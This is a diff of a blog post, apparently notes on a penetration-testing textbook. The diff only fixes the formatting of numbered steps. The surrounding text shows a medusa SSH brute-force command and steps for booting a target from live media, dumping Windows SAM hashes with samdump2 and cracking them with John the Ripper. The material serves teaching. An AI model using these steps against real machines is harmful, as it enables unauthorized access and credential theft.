@@ -39,7 +39,7 @@ medusa –h 192.168.18.132 –u ownedb –P /usr/share/john/password.lst –M ss
   2. Boot the target to Backtack or an alternate OS via a live CD or USB drive.
   
   3. Mount the local hard drive.
-
+  
 ```
   mkdir /mnt/sda1
   mount /dev/sda1 /mnt/sda1
@@ -50,8 +50,8 @@ medusa –h 192.168.18.132 –u ownedb –P /usr/share/john/password.lst –M ss
 <img src="https://github.com/victor-infosec/victor-infosec.github.io/raw/master/_posts/books/The-Basics-of-Hacking-and-Penetration-Testing/5.png" alt="渗透测试流程5" height="50%" width="50%" />
 </div>
 
-  \4. Use Samdump2 and to extract the hashes.
-
+  4. Use Samdump2 and to extract the hashes.
+  
 ```
   samdump2 system SAM > /tmp/hashes.txt
 ```
@@ -67,7 +67,7 @@ medusa –h 192.168.18.132 –u ownedb –P /usr/share/john/password.lst –M ss
   samdump2 SAM sys_key.txt > /tmp/hash.txt
 ```
 
-  \5. Use JtR to crack the passwords.
+  5. Use JtR to crack the passwords.
 
 ```
   john /tmp/hashes.txt --format=nt
